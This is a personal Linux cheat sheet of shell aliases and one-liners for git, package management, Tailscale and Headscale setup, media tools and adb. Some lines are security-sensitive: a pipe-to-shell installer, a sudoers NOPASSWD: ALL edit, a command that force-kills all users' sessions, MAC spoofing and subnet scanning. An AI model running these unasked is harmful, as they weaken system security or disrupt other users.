$> alias remove="sudo pacman -Rns"
$> alias rymove="yay -Rns"
$> alias upgrade="update && ypdate"
## common foders
$> alias dl="cd ~/Downloads"
$> alias ms="cd ~/Music"
$> alias dr="cd ~/Dropbox"
$> alias pr="cd ~/Projects"
$> alias dots="cd ~/.dotfiles"
$> alias ~="cd ~"
$> alias ..="cd ..;pwd"
$> alias ...="cd ../..;pwd"
## balena
$> alias balena="nohup /usr/bin/balenaEtcher-1.14.3-x64.AppImage > /dev/null &"
## git
$> alias g="git $1"
$> alias gs="git status"
$> alias gl="git log"
$> alias gd="git diff $1 $2"
$> alias gi="git init $1"
$> alias gr="git remote $1"
$> alias gf="git fetch $1"
$> alias gm="git merge $1"
$> alias gr="git reset $"
$> alias gsw="git switch"
$> alias gco="git checkout $1"
$> alias gcb="git checkout -b $1"
$> alias ga="git add $1"
$> alias gaa="git add ."
$> alias gcm="git commit -m 'minor fixes'"
$> alias gc="git commit -m $1"
$> alias gp="git push $1 $2"
$> alias gpo="git push origin $1"
$> alias gpom="git push origin master"
$> alias gpm="gaa && gcm && gp"
$> alias gplom="git pull origin master"
$> alias gpl="git pull $1 $2"
$> alias gplr="git pull --rebase $1 $2"
$> alias gsh="git stash"
$> alias gshp="git stash pop"
## config i3 edit
$> alias i="vim ~/.config/i3/config"
$> alias ic="vim ~/.config/i3/custom.config"
$> alias p="vim ~/.config/polybar/config.ini"
$> alias pc="vim ~/.config/polybar/custom.config.ini"
$> alias r="vim ~/.config/rofi/config.rasi"
$> alias x=startx
## dotman / .dotfiles repo
$> alias dotman="~/.dotfiles/dotman.sh"
## hibernation
$> alias sleep="systemctl hibernate"
## wifi on/off
$> alias wifion="nmcli radio wifi on"
$> alias wifioff="nmcli radio wifi off"
## Vim for root
$> alias rvim="sudo -E vim"
## Bash shortcuts
$> alias mx="chmod +x"
$> alias psg="ps -aux | grep"
## 7Z
$> alias unzip="7z x '*.zip';7z x '*.7z';7z x '*.rar'"
## cmus
$> alias cmus="[ -f /sbin/cmus ] && cd ~/Music && cmus && cd - > null"
## haskell
$> alias cr="cabal repl"
$> alias cb="cabal build"
$> alias ci="cabal install"
$> alias gh="ghcid"
$> alias cbi="cabal build && cabal install --overwrite-policy=always"
$> alias h="cd ~/Projects/haskell"
## misc
$> alias i3asus="cp ~/.dotfiles/i3/.config/i3/config ~/.config/i3/"
$> alias yt="yt-dlp -f $1 $2"
## save last command from history to a file
## tip, add a comment to end of command before saving, ex: ls --color=auto # colored ls output
a sl='fc -ln -1 | sed "s/^\s*//" >> ~/.saved_commands.txt'
## short-cut to grep that file
a slg='< ~/.saved_commands.txt grep'
## Corrections.
  aliases = {
    "x" = "exit";
    "celar" = "clear";
    "tf" = "terraform";
    "kubeclt" = "kubectl";
    "edit" = "cd /home/jsh/git/jsh-nix/";
    "nixfmt" = "nixpkgs-fmt";
    "osbuild" = "nix build .#nixosConfigurations.$(hostname).config.system.build.toplevel";
    "osinstall" = "./result/bin/switch-to-configuration switch";
    "tvfb" = "filebot -r -rename * -non-strict --format /home/jsh/TV/\"{n.space('_')}-{y}/{s00e00}-{t.space('_')}\"";
    "moviefb" = "filebot -rename * -non-strict --format \"{n.space('_')}-{y}\"";
  };
##
$> alias lsd='ls -l | grep ^d'
$> alias lslrt='find . -printf '\''%T@ %t %p\n'\'' | sort -k 1 -n | cut -d'\'' '\'' -f2-'
$> alias lsrt='find . -type f -printf '\''%T@ %P\n'\'' | sort -n | awk '\''{print }'\'''
$> alias memacs='emacs -mm'
$> alias mkdir='mkdir -p'
$> alias more='/usr/bin/less'
$> alias mv='mv -i'
$> alias rm='rm -i'
#$> alias rebuild=sudo nixos-rebuild
#$> alias jfu='journalctl -fu'
#$> alias jru=‘journalctl -ru'
#$> alias python=‘python3’ # or vice Versa depending on os
#$> alias copy=‘xclip -selection c’
##
$> alias ffmpeg='ffmpeg -hide_banner'
$> alias pacman='sudo pacman'
$> alias yay='yay --sudoloop'
$> alias c=clear
$> alias :=sudo
## render input with syntax highlighting
$> alias hl='highlight -t3 -O xterm256'
## generate inline QR code of supplied data
$> alias qr='qrencode -t ANSI256 -o - '
## generate random password
$> alias pwgen='cat /dev/urandom | head -c 1024 | base64 | head -c 16 ; echo'
## Determine wan IP address by querying OpenDNS resolver
$> alias wanip='dig +short myip.opendns.com @208.67.220.220'
## display password and QR code for currently connected WiFi network
$> alias wifipwd='nmcli dev wifi show-password'
$> alias ls='exa --group-directories-first'
$> alias ll='exa -l --group-directories-first'
$> alias yt2mp3="yt-dlp -x --audio-format mp3 -o '%(title)s.%(ext)s'"
$> alias ytdl="yt-dlp -f 'bestvideo+bestaudio/best' -o '%(title)s.%(ext)s' --cookies '/home/vorthas/Software/0-Configuration/youtube.com_cookies.txt'"
## ############################
## ##    END bash extra alias
## ############################
## ############################
##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================
## gui, web. Search_provider_overrides in chrome
$> cat /etc/chromium/master_preferences
##==========================================
## gnome thumbnails in the file picker
$> yay -Sy gtk2-patched-filechooser-icon-view gtk3-patched-filechooser-icon-view
##==========================================
## files. Viewing CSV Files in a Better Format
$> function view_csv {
    if [ -z "$1" ]; then echo "Usage: view_csv <file.csv>"
    else cat "$1" | column -s, -t | less -F -S -X -K
    fi
}
## This bash function comes in pretty handy when viewing csv files directly on the terminal. Here’s the explanation for this one liner.
##    cat "$1" ## Reads the content of the specified CSV file.
##    column -s, -t ## Uses the column command to format the content into a table
##        -s, ## Specifies that columns are separated by commas in the CSV file.
##        -t ## Tells column to create the table output.
## less -F -S -X -K
##        less: ## Displays the formatted table output in the terminal.
##        -F ## Quits if the entire file fits on one screen.
##        -S ## Chops long lines to fit within the screen width.
##        -X ## Leaves the screen’s contents intact upon exiting less
##        -K ## Exits less on Ctrl+C.
##==========================================
## files. Checking Recently Modified Files
## This Bash function, recently_modified, proves to be quite handy for my team when keeping track of the latest modifications made to various files on the server.
$> function recently_modified() {
    recent_file=$(ls -t | head -n1)
    echo "Most recently modified file: $recent_file"
}
##==========================================
## files. compression. Compressing Multiple Files
$> function compress_files() {
    if [ -z "$1" ]; then echo "Usage: compress_files <archive_name.zip> <file1> <file2> ..."
    else zip -r "$1" "${@:2}"
    fi
}
##==========================================
## files. Searching text in files
$> function search_text_in_files() {
    if [ -z "$1" ] || [ -z "$2" ]; then echo "Usage: search_text_in_files <directory> <search_term>"
    else grep -rnw "$1" -e "$2"
    fi
}
##==========================================
## os. ram. Checking high usage memory processes
function process_with_most_memory() { ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head }
##==========================================
## Listing Open Ports
function list_open_ports() { netstat -tuln }
##--------------------
## Listening Ports for specific process
function find_listening_ports() { if [ -z "$1" ]; then echo "Usage: find_listening_ports <pid>"
    else ss -tulnp | grep "$1"
    fi
}
##==========================================
## ###################################################
## ##    tailscale headscale
## ###################################################
## tailscale with their server
$> https://tailscale.com/
## Add a device
$> curl -fsSL https://tailscale.com/install.sh | sh
## Register
$> sudo tailscale up --operator=$USER
##---------------------------
## Headscale
$> https://headscale.net/running-headscale-linux/
## Create a headscale server instance
## ssh to server
$> ssh ops@34.83.225.82
## Install
## Download the latest Headscale package for your platform (.deb for Ubuntu and Debian).
$> https://github.com/juanfont/headscale/releases/download/v0.22.3/headscale_0.22.3_linux_amd64.deb
## OR
$> HEADSCALE_VERSION="0.22.3" # See above URL for latest version, e.g. "X.Y.Z" (NOTE: do not add the "v" prefix!)
$> HEADSCALE_ARCH="amd64" # Your system architecture, e.g. "amd64"
$> wget --output-document=headscale.deb \
$>   "https://github.com/juanfont/headscale/releases/download/v${HEADSCALE_VERSION}/headscale_${HEADSCALE_VERSION}_linux_${HEADSCALE_ARCH}.deb"
$> sudo apt install ./headscale.deb
## Setup configuration
$> sudo vim /etc/headscale/config.yaml
## OR
$> sed -i 's/listen_addr: 127.0.0.1:8080/listen_addr: 0.0.0.0:8080/' /etc/headscale/config.yaml
$> sed -i 's/grpc_listen_addr: 127.0.0.1:50443/grpc_listen_addr: 0.0.0.0:50443/' /etc/headscale/config.yaml
## Enable and turn on headscale
$> sudo systemctl enable headscale
$> sudo systemctl start headscale
$> sudo systemctl status headscale
## Using Headscale
#sudo headscale users create myfirstuser
$> sudo headscale users create YOURMACHINENAMEHERE
## Find the URL of the new Headscale server and use that and a generated key to
## Generate a key using the command line:
## Return a pre-authenticated key that is used to connect a node to headscale during the tailscale command:
$> sudo headscale --user YOURMACHINENAMEHERE preauthkeys create --reusable --expiration 24h
## Will spit out a key to add to the machine to add to the mesh tailnet network.
##------------------------------------------
## tailscale with headscale server
$> https://tailscale.com/
## Add a device
$> curl -fsSL https://tailscale.com/install.sh | sh
## Register
## On client, Use key from above.
$> sudo tailscale up --login-server=http://34.83.225.82:8080 --authkey=08bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx5286
$> sudo tailscale status --json
## find your Tailscale IPv4 address by running:
$> tailscale ip -4
##--------------------------------------
## Auth with key
sudo tailscale up --authkey=tskey-auth-kzhxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxS3
## ###################################################

##==========================================
## multimedia. video. Transcode video and remove audio
$> ffmpeg -i -an video.mp4 video.webm
##==========================================
## Find out what services are most active
$> systemd-analyze blame
##==========================================
## French AI startup Mistral tweeted
https://twitter.com/MistralAI/status/1706877320844509405?ref=404media.co
## a magnet link
magnet:?xt=urn:btih:208b101a0f51514ecf285885a8b0f6fb1a1e4d7d&dn=mistral-7B-v0.1&tr=udp%3A%2F%http://2Ftracker.opentrackr.org%3A1337%2Fannounce&tr=https%3A%2F%http://2Ftracker1.520.jp%3A443%2Fannounce
## to their first publicly released, open sourced LLM, writes Slashdot reader jenningsthecat. "That might be merely interesting if not for the fact that the chatbot has remarkably few guardrails."
https://docs.mistral.ai/quickstart/
## If you have downloaded the weights in the Hugging Face format on your local instance in the folder /path/to/model, you can directly run:
docker run --gpus all \
    -p 8000:8000 \
    -v /path/to/model/:/mnt/model/ \
     ghcr.io/mistralai/mistral-src/vllm:latest \
    --host 0.0.0.0 \
    --model="/mnt/model/"
##
https://docs.mistral.ai/api
## You can then use the following command to start the server:
python -u -m vllm.entrypoints.openai.api_server --host 0.0.0.0 --model mistralai/Mistral-7B-v0.1
##==========================================
## Search google, and get all the links, in one command! [POSIX]
## With this command, you can search google, and scrape the answers, one line:
$> printf 'GET /search?q=my+query\n' | nc google.com 80 | tidy --custom-tags blocklevel -i | awk '/\/url\?q=.*/{print $0}'
##==========================================
$> firefox https://www.cyberciti.biz/faq/bash-for-loop/
##==========================================
## networking. ssh. keys. Add your ssh keys to a server.
$> rsync -e "ssh -i ~/.ssh/key" -aAXvP $wd/your-files $pc:/path/to/upload
##==========================================
$> firefox https://www.reddit.com/r/linux/comments/15zbs51/bootconfigunamer/
##==========================================
## Cleanup remote git repository of all branches already merged into master
## This is useful in teams where developers don't bother to remove branches after merging PR. These branches make it hard to seek for really useful branches, which gives us a nice value of finding and exploring other people's code even before they create PR for it.
$> git branch --remotes --merged | grep -v master | sed 's@ origin/@:@' | xargs git push origin
##==========================================
## Remove multiple entries of the same command in .bash_history with preserving the chronological order
## Only the first appearance of a repeated command in the history will be kept. Otherwise, if you prefer to keep last occurrence of a repeated command then maybe you can achieve that by including reverse input/output i.e with 'tac' command in expression above. To see statistics of removed repeated commands: diff --suppress-common-lines -y ~/.bash_history.bak ~/.bash_history|uniq -c|sort -n|tr -s " "|sed '/^ 1/d'|grep '<'
$> cp -a ~/.bash_history ~/.bash_history.bak && perl -ne 'print unless $seen{$_}++' ~/.bash_history.bak >~/.bash_history
##==========================================
## Define a word from Linux Terminal
## The link gets the definition from vocabulary.com. In case you are behind firewall, use --proxy URL in the curl option. Show Sample Output
$> function define() { curl -s https://www.vocabulary.com/dictionary/$1 | grep 'og:description' | sed 's/&#[0-9][0-9][0-9]//g' | awk -F "\"" '{print $4}' }
##==========================================
## Visual alert with keyboard LEDs
$> for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done
##==========================================
## Progress in real time with correct Size in %. But also needs the packages sudo,dd,pv and dialog.
$> image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'
##==========================================
## Check difference between two file directories recursively
$> diff <(tree /dir/one) <(tree /dir/two)
##==========================================
## Print all git repos from a user
$> curl -s https://api.github.com/users/<username>/repos?per_page=1000 |grep git_url |awk '{print $2}'| sed 's/"\(.*\)",/\1/'
##==========================================
## Get all upgradable deb packages in a single line
## Works for debian and ubuntu based distros. Show Sample Output
$> apt list --upgradable | grep -v 'Listing...' | cut -d/ -f1 | tr '\r\n' ' ' | sed '$s/ $/\n/'
##==========================================
## rsync using pem file
## Especially useful while syncing to Amazon EC2 instance. avz stands for archive verbose compress
$> rsync -e 'ssh -i /root/my.pem' -avz /mysql/db/data_summary.* ec2-1-2-4-9.compute-1.amazonaws.com:/mysql/test/
##==========================================
## List the binaries installed by a Debian package
## GNU greps perl-compatible regular expression(PCRE).
$> binaries () { dpkg -L "$1" | grep -Po '.*/bin/\K.*'; }
## or
$> binaries () { for f in $(dpkg -L "$1" | grep "/bin/"); do basename "$f"; done; }
##==========================================
## Find dupe files by checking md5sum
$> find /glftpd/site/archive -type f|grep '([0-9]\{1,9\})\.[^.]\+$'|parallel -n1 -j200% md5sum ::: |awk 'x[$1]++ { print $2 " :::"}'|sed 's/^/Dupe: /g'|sed 's,Dupe,\x1B[31m&\x1B[0m,'
##==========================================
## Make window transparent (50% opacity) in Gnome shell
## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
$> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
##==========================================
## Delete all local git branches that have been merged and deleted from remote
$> git branch -d $( git branch -vv | grep '\[[^:]\+: gone\]' | awk '{print $1}' | xargs )
##==========================================
## rsync should continue even if connection lost
## Manage partial uploads using append option.
$> rsync --archive --recursive --compress --partial --progress --append root@123.123.123.123:/backup/somefile.txt.bz2 /home/ubuntu/
##==========================================
## convert raw camera image to jpeg
## raw image created by canon digital camera. Install using apt-get install ufraw
$> for i in *.CR2; do ufraw-batch $i --out-type=jpeg --output $i.jpg; done;
##==========================================
## Check if port is open on remote machine
## Check if port is open, if you dont have ncat on your machine. Show Sample Output
$> echo > /dev/tcp/127.0.0.123/8085 && echo "Port is open"
##==========================================
## List all accessed configuration files while executing a program in linux terminal (improved version)
## Last listed files presumably have higher precedency then files listed first, i.e. configuration files in the personal .config directory will be listed last and their config parameters will be more authoritative then default config parameters defined in /etc directory which are usually listed above them. If you replace ".conf" with ".ini" in the command, initial files will be listed instead of config files. If you do not like to list multiple access to the same config file, pipe to "uniq" or "uniq -c" to prefix lines by the number of occurrences Show Sample Output
$> strace 2>&1 <any_executable> |egrep -o "\".*\.conf\""
##==========================================
## Tail a log and replace according to a sed pattern
## Tails a log and replaces it line-by-line according to whatever you want to replace. Useful if the file writing to the log cant be modified, so you need to modify its output instead. Show Sample Output
$> tail -F logfile|while read l; do sed 's/find/replace/g' <<< $l; done
##==========================================
## find hard linked files (duplicate inodes) recursively
## If you have two sets of files that may share hard-linked files, it can be useful to identify which ones are hard links to same underlying inode (file). This command shows you all of those, sorted by inode#. In my example the two directory trees to compare share a common parent, so I run the command in that parent and just use find . to start from the current directory. If yours are in different locations, you can pass both paths to find: find /directory1 /directory2 -type f -printf '%10i %p\n' | sort | uniq -w 11 -d -D | less Show Sample Output
$> find . -type f -printf '%10i %p\n' | sort | uniq -w 11 -d -D | less
##==========================================
## Find out how much ram memory has your video (graphic) card
$> glxinfo |grep -i -o 'device|memory\|[0-9]\{1,12\} MB'|head -n 1
##==========================================
## Find non-ASCII and UTF-8 files in the current directory
$> find . -type f -regex '.*\.\(cpp\|h\)' -exec file {} \; | grep "UTF-8\|extended-ASCII"
##==========================================
## openssl Generate Self Signed SSL Certifcate
## generating self signed ssl certificate to use in dovecot postfix nginx Self signed certificates can be used for private encryptions between server and client and must be manually accepted on browser/ client Show Sample Output
$> openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/myblog.key -x509 -days 365 -out /etc/ssl/private/myblog.pem
##==========================================
## rename / move Uppercase filenames to lowercase filenames current directory
## move filename/rename filenames with Uppercase to lowercase in current directory Show Sample Output
$> FileList=$(ls); for FName in $FileList; do LowerFName=$(echo "$FName" | tr '[:upper:]' '[:lower:]'); echo $FName" rename/move to $LowerFName"; mv $FName $LowerFName; done
##==========================================
## Save a copy of all debian packages in the form in which they are installed and configured on your system
## A copy of all installed debian packages on your system will be put back together, with all changes in configuration files you made and placed in the current directory. Make sure you have enough disk space (say 2-3 GB). Break any time with Ctrl+C. Show Sample Output
$> for a in $(sudo dpkg --get-selections|cut -f1); do dpkg-repack $a|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}';done
##==========================================
## Command to logout all the users in one command
$> sudo who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'
##==========================================
## Compute newest kernel version from Makefile on Torvalds git repository
## Get newest kernel version by parsing the most bleeding-edge Makefile possible. Useful for doing things like writing live ebuilds and/or self-updating PKGBUILDs for testing purposes. Breakdown: * wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile — retrieve Makefile and pipe to stdout * head -n5 — only the first 5 lines are relevant, thats where all the version variables are grep -E '\ \=\ [0-9]{1,}' — version variables always have an equals sign followed by a number * cut -d' ' -f3 — extract the individual numbers from the version variables * tr '\n' '.' — replace newlines with periods * sed -e "s/\.$//" — remove trailing period Show Sample Output
$> wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile | head -n5 | grep -E '\ \=\ [0-9]{1,}' | cut -d' ' -f3 | tr '\n' '.' | sed -e "s/\.$//"
##==========================================
## scan multiple log subdirectories for the latest log files and tail them
$> ls /var/log/* -ld | tr -s " " | cut -d" " -f9 | xargs -i{} sh -c 'echo "\n---{}---\n"; tail -n50 {}/`ls -tr {} | tail -n1`'
`##==========================================
## Show current network interface in use
$> ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
##==========================================
## Batch-Convert text file containing youtube links to mp3
$> cat playlist.txt | while read line; do youtube-dl --extract-audio --audio-format mp3 -o "%(title)s.%(ext)s" ytsearch:"$line" ;done
##==========================================
## Combine multiple images into a video using ffmpeg
## The -start_number can be ignored if sequence starts with 0, otherwise use first number in sequence
$> ffmpeg -start_number 0053 -r 1/5 -i IMG_%04d.JPG -c:v libx264 -vf fps=25 -pix_fmt yuv420p out.mp4
##==========================================
## Find failures with journalctl
## Sometimes things break. You can find the most recent errors using a combination of journalctl, along with the classic tools sort and uniq Show Sample Output
$> journalctl --no-pager --since today --grep 'fail|error|fatal' --output json | jq '._EXE' | sort | uniq -c | sort --numeric --reverse --key 1
##==========================================
## Show tcp connections sorted by Host / Most connections
$> netstat -ntu|awk '{print $5}'|cut -d: -f1 -s|sort|uniq -c|sort -nk1 -r
##==========================================
## Download audio from youtube video
$> yt-dlp -f 'ba' -x --audio-format mp3 https://www.youtube.com/watch?v=1La4QzGeaaQ -o '%(id)s.%(ext)s'
##==========================================
## Run a command as soon as another long-running command finishes. E.g. suspend the machine after performing apt upgrade. The process is selected interactively via fzf.
$> tail --pid="$(ps -A -o pid,args | fzf | awk '{print $1}')" -f /dev/null && echo DONE
##==========================================
## Query cheat.sh from the termianl. A quick access cheat sheet for a range of linux commands!
$> curl cheat.sh/<comamnd-to-search>
##==========================================
## Track flight information from the command line
## See the flight information from the CLI Use as a SH file or function, like: `./flight.sh os 336`
$> function flight_status() { curl --silent --stderr - "https://mobile.flightview.com/TrackByRoute.aspx?view=detail&al=$1&fn=$2&dpdat=$(date +%Y%m%d)" | html2text | grep -A19 "Status" ; } ; flight_status $1 $2
##==========================================
## Find non ascii characters in files in folder
$> find . -type f -regex '.*\.\(cpp\|h\)' -exec grep -Pl "[\x80-\xFF]" {} \; | xargs -I % bash -c 'echo "%"; grep --color='auto' -P -n "[\x80-\xFF]" "%"'
##==========================================
## Output requirements.txt packages pinned to latest version
## Given a requirements.txt file with unpinned package names, output the packages pinned to the latest version. Handy to copy/paste back into your requirements.txt when you start a new project. Note that this will download packages but not install them. Show Sample Output
$> pip install -r requirements.txt --dry-run --no-deps --ignore-installed | tail -n1 | tr ' ' '\n' | tail -n+3 | sed -e "s/\(.*\)-/\1==/"
##==========================================
## QEMU From Fedora Livecd + Device CD + Device Disk + UEFI + 800x600 forced
$> sudo qemu-system-x86_64 -enable-kvm -cpu host -M q35 -m 2G -smp 4 --bios /usr/share/edk2/ovmf/OVMF_CODE.fd -drive id=cdrom,file=/dev/sr1,if=none,media=cdrom,format=raw,readonly=on -drive id=disk,file=/dev/md126,if=none,format=raw -device virtio-blk-pci,drive=cdrom -device virtio-blk-pci,drive=disk -device VGA,vgamem_mb=64,xres=800,yres=600
##==========================================
## List all packages in Ubuntu/Debian that no package depends on
$> dpkg-query --show --showformat='${Package}\t${Status}\n' | tac | awk '/installed$/ {print $1}' | xargs apt-cache rdepends --installed | tac | awk '{ if (/^ /) ++deps; else if (!/:$/) { if (!deps) print; deps = 0 } }'
##==========================================
## Show a zoomable world map
$> telnet mapscii.me
##==========================================
## Convert an image sequence into a video
$> ffmpeg -framerate 30 -pattern_type glob -i '*.jpg' -c:v libx264 -pix_fmt yuv420p out.mp4
##==========================================
## List all files in a folder in a git repository by last commit date
## This lists all the files in a folder, then finds the commit date for them one by one, then sorts them from newest to oldest
$> git ls-tree --name-only HEAD foldername/ | while read filename; do echo "$(git log -1 --format="%ci " -- $filename) $filename"; done | sort -r
##==========================================
## Download Video & extract only a specific Time of it
$> ffmpeg $(yt-dlp -g 'https://de.pornhub.com/view_video.php?viewkey=ph637366806d6eb' | sed 's/^/-ss 00:05 -i /') -t 01:00 -c copy out.mp4
##==========================================
## Sudoers: bypass all password prompts
## If you as the sole user of a computer at home only don’t like needing to repeatedly type a password each time you run a command, using ‘NOPASSWD’ in sudoers for your specific username is for you.
$> echo "$USER ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
##==========================================
https://www.reddit.com/r/linux/comments/15zbs51/bootconfigunamer/
https://darkhz.github.io/bluetuith/



##==========================================
## Watch the network for activity to discover devices
$> sudo netdiscover -r 192.168.0.1/24
##==========================================
## ########################################
## ##    Android
## ########################################
## Android Debug Bridge version 1.0.25 adb
$> -d                            - directs command to the only connected USB device
$>                                 returns an error if more than one USB device is present.
$> -e                            - directs command to the only running emulator.
$>                                 returns an error if more than one emulator is running.
$> -s <serial number>            - directs command to the USB device or emulator with
$>                                 the given serial number. Overrides ANDROID_SERIAL
$>                                 envivornment variable.
$> -p <product name or path>     - simple product name like 'sooner', or
$>                                 a relative/absolute path to a product
$>                                 out directory like 'out/target/product/sooner'.
$>                                 If -p is not specified, the ANDROID_PRODUCT_OUT
$>                                 environment variable is used, which must
$>                                 be an absolute path.
$> devices                       - list all connected devices
$> connect <host>:<port>         - connect to a device via TCP/IP
$> disconnect <host>:<port>      - disconnect from a TCP/IP device
## device commands:
$>  adb push <local> <remote>    - copy file/dir to device
$>  adb pull <remote> <local>    - copy file/dir from device
$>  adb sync [ <directory> ]     - copy host->device only if changed
$>                                 (see 'adb help all')
$>  adb shell                    - run remote shell interactively
$>  adb shell <command>          - run remote shell command
$>  adb emu <command>            - run emulator console command
$>  adb logcat [ <filter-spec> ] - View device log
$>  adb forward <local> <remote> - forward socket connections
$>                                 forward specs are one of:
$>                                   tcp:<port>
$>                                   localabstract:<unix domain socket name>
$>                                   localreserved:<unix domain socket name>
$>                                   localfilesystem:<unix domain socket name>
$>                                   dev:<character device name>
$>                                   jdwp:<process pid> (remote only)
$>  adb jdwp                     - list PIDs of processes hosting a JDWP transport
$>  adb install [-l] [-r] <file> - push this package file to the device and install it
$>                                 ('-l' means forward-lock the app)
$>                                 ('-r' means reinstall the app, keeping its data)
$>  adb uninstall [-k] <package> - remove this app package from the device
$>                                 ('-k' means keep the data and cache directories)
$>  adb bugreport                - return all information from the device
$>                                 that should be included in a bug report.
$>  adb help                     - show this help message
$>  adb version                  - show version num
## DATAOPTS:
$> (no option)                   - dont touch the data partition
$>  -w                           - wipe the data partition
$>  -d                           - flash the data partition
## scripting:
$>  adb wait-for-device          - block until device is online
$>  adb start-server             - ensure that there is a server running
$>  adb kill-server              - kill the server if it is running
$>  adb get-state                - prints: offline | bootloader | device
$>  adb get-serialno             - prints: <serial-number>
$>  adb status-window            - continuously print device status for a specified device
$>  adb remount                  - remounts the /system partition on the device read-write
$>  adb reboot [bootloader|recovery] - reboots the device, optionally into the bootloader or recovery program
$>  adb root                     - restarts the adbd daemon with root permissions
$>  adb usb                      - restarts the adbd daemon listening on USB
$>  adb tcpip <port>             - restarts the adbd daemon listening on TCP on the specified port
## networking:
$>  adb ppp <tty> [parameters]   - Run PPP over USB.
##  Note: you should not automatically start a PPP connection.
$> <tty> refers to the tty for PPP stream. Eg. dev:/dev/omap_csmi_tty1
##  [parameters] - Eg. defaultroute debug dump local notty usepeerdns
$> adb sync notes: adb sync [ <directory> ]
##   <localdir> can be interpreted in several ways:
##   - If <directory> is not specified, both /system and /data partitions will be updated.
##   - If it is "system" or "data", only the corresponding partition
##     is updated.
## android-sdk-platform-tools
$> adb push "Ahsoka.S01E03.2160p.WEBRip.x265.DDP5.1.Atmos-KONTRAST.mkv" /sdcard/
$> adb pull "/storage/emulated/0/Download/Star Wars - The Thrawn Trilogy by Timothy Zahn/1. Star Wars - Heir to the Empire.m4b" /home/$USER/Downloads
##---------------------------
$> adb shell sm set-force-adoptable true

##=======================================================
##  Formats the card as an EXT4 drive with 128-bit AES encryption that is mounted as part of the system and set as the preferred storage. You’ll even be prompted to move your data over to it, and, as you’d expect, new data is saved on this “adopted storage” by default.


##=======================================================
## network. Route add default gateway. Add route default gateway on shell
$> route add default gw 192.168.10.1 //OR// ip route add default via 192.168.10.1 dev eth0 //OR// ip route add default via 192.168.10.1
##==========================================
## network. wifi. Wifi power setting
$> cat /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf
## By default there is:
    ## [connection]
    ## wifi.powersave = 3
## Possible values for the wifi.powersave field are:
    ## NM_SETTING_WIRELESS_POWERSAVE_DEFAULT (0): use the default value
    ## NM_SETTING_WIRELESS_POWERSAVE_IGNORE  (1): dont touch existing setting
    ## NM_SETTING_WIRELESS_POWERSAVE_DISABLE (2): disable powersave
    ## NM_SETTING_WIRELESS_POWERSAVE_ENABLE  (3): enable powersave
## Change the value to 2.
$> sudo sed -i 's/wifi.powersave = 3/wifi.powersave = 2/' /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf
## To take effect, just run:
$> sudo systemctl restart NetworkManager
##==========================================
## networking. hardware. Change MAC address.
$> ip link show
$> sudo ip link set dev <Device> down
$> sudo ip link set dev wlp3s0 down
## Now, you can assign a new MAC address to your device by executing the command below, where <Device> must be replaced with your network device, and <New MAC address> must be replaced with the new MAC address you want to assign to your device.
$> sudo ip link set dev <Device> address <New mac address>
$> sudo ip link set dev wlp3s0 address 12:34:56:78:90:ab
$> ip link show
## Finally, set your network card up again by running the following command, where <Device> must be replaced with your network card.
$> sudo ip link set dev <Device> up
$> sudo ip link set dev wlp3s0 up
##==========================================
$> ffmpeg -i input.mp4 -c:v libvpx-vp9 -b:v 0 -crf 30 -pass 1 -an -f null /dev/null && \
$> ffmpeg -i input.mp4 -c:v libvpx-vp9 -b:v 0 -crf 30 -pass 2 -c:a libopus output.webm

##==========================================
$> ssh ubuntu@192.168.0.190


##==========================================
## os. user. Add a new user with a home.
$> sudo useradd -m -d /home/usernamehere usernamehere
$> sudo useradd -m usernamehere
## Delete a user
$> sudo userdel -r usernamehere
##==========================================
## Get the current wifi password of a Connected Device with NMCLI
$> nmcli device wifi show-password
## Comes with a QR code, so make sure your trust the source, if running from a device other than your own.

##==========================================
## Text Editor
## Sublime
## Adding a Line
$> Alt+Shift+⬆          ## To add the line above to the selection:
$> Alt+Shift+⬇          ## To add the line below to the selection:
$> Ctrl+U               ## If you go too far, use Undo Selection to step backwards:
## Splitting the Selection into Lines
$> Ctrl+Shift+L         ## Select a block of lines, and then split it into many selections, one per line:
## Quick Add Next
$> Ctrl+D               ## To add the next occurrence of the current word to the selection, use Quick Add Next, which is bound to:
$> Ctrl+U               ## Again, if you go too far, use Undo Selection to step backwards:
$> Ctrl+K, Ctrl+D       ## Individual occurrences can be skipped via Quick Skip Next, which is bound to:
## Find All
$> Alt+F3               ## To add all occurrences of the current word to the selection, use Find All:
## Single Selection
$> Esc                  ## To go from multiple selections to a single selection, press
##------------------------------
## VS Code
## Basic editing
$> Ctrl+X                  ## Cut line (empty selection)
$> Ctrl+C                  ## Copy line (empty selection)
$> Alt+ ↓ / ↑              ## Move line down/up
$> Ctrl+Shift+K            ## Delete line
$> Ctrl+Enter /            ## Insert line below
$> Ctrl+Shift+Enter        ## Insert line above
$> Ctrl+Shift+\            ## Jump to matching bracket
$> Ctrl+]                  ## Indent line
$> Ctrl+[                  ## Outdent line
$> Home /                  ## End Go to beginning/end of line
$> Ctrl+ Home / End        ## Go to beginning/end of file
$> Ctrl+ ↑ / ↓             ## Scroll line up/down
$> Alt+ PgUp / PgDn        ## Scroll page up/down
$> Ctrl+Shift+ [ / ]       ## Fold/unfold region
$> Ctrl+K Ctrl+ [ / ]      ## Fold/unfold all subregions
$> Ctrl+K Ctrl+0 /         ## Fold all regions
$> Ctrl+K Ctrl+J           ## Unfold all regions
$> Ctrl+K Ctrl+C           ## Add line comment
